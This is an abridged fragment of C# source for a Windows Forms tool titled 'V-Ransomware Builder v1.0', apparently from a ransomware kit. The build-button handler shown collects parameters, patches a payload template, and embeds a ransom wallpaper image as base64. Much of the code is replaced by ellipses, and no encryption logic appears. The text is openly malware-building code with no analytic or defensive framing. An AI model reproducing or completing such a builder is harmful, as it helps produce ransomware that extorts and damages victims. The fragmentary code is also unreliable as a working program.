...
namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        ...
        {
            this.Text = "V-Ransomware Builder v1.0";
        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                lblDetail.Text = "Collecting parameters...";
                ...
                lblDetail.Text = "Patching template...";
                ...
                if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
                {
                    ...
                    ReplaceString(template, "|WALLPAPER_BASE64|", Convert.ToBase64String(imageData));
